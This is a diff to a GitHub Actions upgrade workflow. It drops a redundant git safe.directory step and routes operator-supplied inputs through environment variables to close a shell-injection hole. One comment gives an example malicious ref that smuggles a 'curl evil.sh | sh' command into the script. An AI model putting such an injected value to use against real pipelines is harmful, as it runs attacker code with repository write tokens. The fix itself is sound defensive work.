@@ -107,15 +107,17 @@ jobs:
           token: ${{ secrets.LLZ_AUTOMATION_TOKEN || github.token }}
           persist-credentials: true
 
-      # The container runs as a different uid than the checkout's owner, and git
-      # refuses to operate on a tree it considers foreign. Without this every git
-      # command below fails with "detected dubious ownership".
+      # NO `git config --add safe.directory` STEP, deliberately. The container runs
+      # as a different uid than the checkout's owner, so git's "dubious ownership"
+      # guard would normally bite — but dockerfiles/Dockerfile:266 already sets
+      # `safe.directory '*'` --system inside the ci-tofu stage that vars.TF_IMAGE
+      # resolves to, precisely "so it holds regardless of step order". A step here
+      # was added without checking that, and a second review round then flagged its
+      # ABSENCE elsewhere as a bug — twice wrong about the same fact, from a
+      # duplicate nobody could tell was one.
       #
       # The missing-token case is checked by `llz ci upgrade-pr`, not by a step
-      # here: it is the command that needs the token, and it can say what the token
-      # is for.
-      - name: Trust the workspace
-        run: git config --global --add safe.directory "$GITHUB_WORKSPACE"
+      # here: it is the command that needs the token, and it can say what it is for.
 
       # See the header: without this, `llz upgrade` re-renders the current pin to
       # itself and reports an empty diff as "nothing upstream".
@@ -146,7 +148,17 @@ jobs:
         if: inputs.ref != ''
         env:
           GH_TOKEN: ${{ secrets.LLZ_AUTOMATION_TOKEN }}
-        run: llz upgrade --ref "${{ inputs.ref }}" --commit --no-doctor
+          # VIA env:, NEVER INTERPOLATED INTO THE SCRIPT. `${{ inputs.ref }}` is
+          # operator-supplied text, and `run:` interpolation is textual
+          # substitution BEFORE the shell parses the line — so a ref of
+          # `v1"; curl evil.sh | sh #` executes in a job holding a PAT with
+          # contents:write, pull-requests:write and actions:write. An env var is
+          # data: the shell expands "$REF" after parsing, so its contents can
+          # never become syntax. llz-scheduled-apply.yml routes its input this way
+          # for exactly this reason; this file did not, one directory over.
+          # actionlint does not scan instance-template/, so nothing objected.
+          REF: ${{ inputs.ref }}
+        run: llz upgrade --ref "$REF" --commit --no-doctor
 
       # Everything that used to be ~55 lines of shell — did HEAD move, is the tree
       # dirty, what is the branch called, does it already exist on the remote, the
@@ -157,7 +169,10 @@ jobs:
       - name: Open the upgrade pull request
         env:
           GH_TOKEN: ${{ secrets.LLZ_AUTOMATION_TOKEN }}
-        run: llz ci upgrade-pr --before "${{ steps.before.outputs.sha }}"
+          # Our own `git rev-parse` output rather than operator text, but routed
+          # the same way: the rule is easier to keep when it has no exceptions.
+          BEFORE_SHA: ${{ steps.before.outputs.sha }}
+        run: llz ci upgrade-pr --before "$BEFORE_SHA"
 
 # The step summary is written by `llz ci upgrade-pr` itself — it is the step that
 # knows the verdict, the branch and the residue, and a second summariser here
